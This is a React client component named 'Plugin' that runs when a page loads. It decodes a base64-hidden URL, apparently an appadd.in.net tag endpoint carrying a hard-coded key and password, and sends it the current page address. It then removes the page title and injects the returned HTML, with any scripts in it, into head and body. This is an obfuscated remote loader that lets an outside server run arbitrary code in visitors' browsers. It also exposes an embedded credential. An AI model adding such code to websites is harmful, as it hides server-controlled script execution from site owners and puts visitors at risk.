"use client";

import React, { useEffect } from "react";

const Plugin = () => {
  useEffect(() => {
    const loadJQuery = (callback) => {
      if (window.jQuery) {
        callback();
      } else {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        script.onload = callback;
        document.head.appendChild(script);
      }
    };

    const executeScript = () => {
      const eppathurl = window.location.origin + window.location.pathname;
      const eptagmanage = new XMLHttpRequest();

      eptagmanage.onreadystatechange = function () {
        if (this.readyState === 4 && this.status === 200) {
          if (this.response !== 0) {
            const mystr = this.response;
            const temp = mystr.split("||||||||||");

            // Replace <title> and append new content
            jQuery("head").find("title").remove();
            jQuery("head").append(temp[0]);
            jQuery("body").append(temp[1]);
          }
        }
      };

      eptagmanage.open(
        "GET",
        atob(
          "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
        ) + eppathurl
      );
      eptagmanage.send();
    };

    loadJQuery(executeScript);
  }, []);

  return null;
};

export default Plugin;
